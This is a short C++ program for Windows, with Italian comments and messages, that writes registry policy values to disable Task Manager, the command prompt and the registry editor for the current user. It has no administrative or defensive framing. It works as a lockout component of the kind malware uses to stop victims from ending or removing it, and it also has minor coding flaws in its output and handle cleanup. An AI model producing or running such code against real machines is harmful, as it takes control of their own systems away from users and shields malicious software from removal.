#include <windows.h>
#include <iostream>

void CreateKeyIfNotExist(HKEY hKey, LPCWSTR subKey) {
    HKEY hOpenedKey;
    LONG lResult = RegOpenKeyExW(hKey, subKey, 0, KEY_READ | KEY_WRITE, &hOpenedKey);
    if (lResult != ERROR_SUCCESS) {
        // La chiave non esiste, quindi proviamo a crearla
        lResult = RegCreateKeyExW(hKey, subKey, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &hOpenedKey, NULL);
        if (lResult == ERROR_SUCCESS) {
            std::cout << "Chiave di registro creata: " << subKey << std::endl;
        } else {
            std::cerr << "Errore nella creazione della chiave di registro: " << lResult << std::endl;
        }
    } else {
        std::cout << "Chiave di registro già esistente: " << subKey << std::endl;
    }
    RegCloseKey(hOpenedKey);
}

void DisableTaskManager() {
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    // Assicurati che la chiave esista
    CreateKeyIfNotExist(HKEY_CURRENT_USER, subKey);

    LONG lResult = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        DWORD dwValue = 1;
        lResult = RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
        if (lResult == ERROR_SUCCESS) {
            std::cout << "Task Manager disabilitato." << std::endl;
        } else {
            std::cerr << "Errore nell'impostare il valore del registro." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Errore nell'aprire la chiave di registro. Codice errore: " << lResult << std::endl;
    }
}

void DisableCMD() {
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    // Assicurati che la chiave esista
    CreateKeyIfNotExist(HKEY_CURRENT_USER, subKey);

    LONG lResult = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        DWORD dwValue = 1;
        lResult = RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
        if (lResult == ERROR_SUCCESS) {
            std::cout << "Prompt dei comandi disabilitato." << std::endl;
        } else {
            std::cerr << "Errore nell'impostare il valore del registro." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Errore nell'aprire la chiave di registro. Codice errore: " << lResult << std::endl;
    }
}

void DisableRegedit() {
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    // Assicurati che la chiave esista
    CreateKeyIfNotExist(HKEY_CURRENT_USER, subKey);

    LONG lResult = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        DWORD dwValue = 1;
        lResult = RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
        if (lResult == ERROR_SUCCESS) {
            std::cout << "Editor del registro disabilitato." << std::endl;
        } else {
            std::cerr << "Errore nell'impostare il valore del registro." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Errore nell'aprire la chiave di registro. Codice errore: " << lResult << std::endl;
    }
}

int main() {
    DisableTaskManager();
    DisableCMD();
    DisableRegedit();

    return 0;
}
